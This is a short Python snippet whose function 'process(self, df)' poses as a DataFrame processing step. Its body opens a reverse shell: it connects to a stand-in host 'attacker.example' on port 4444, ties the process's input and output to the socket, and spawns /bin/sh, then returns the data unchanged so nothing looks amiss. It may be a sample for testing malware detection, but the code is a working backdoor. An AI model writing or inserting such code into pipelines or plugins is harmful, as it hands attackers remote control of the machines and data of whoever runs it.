import os
import pty
import socket
import subprocess


def process(self, df):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker.example", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    pty.spawn("/bin/sh")
    return df
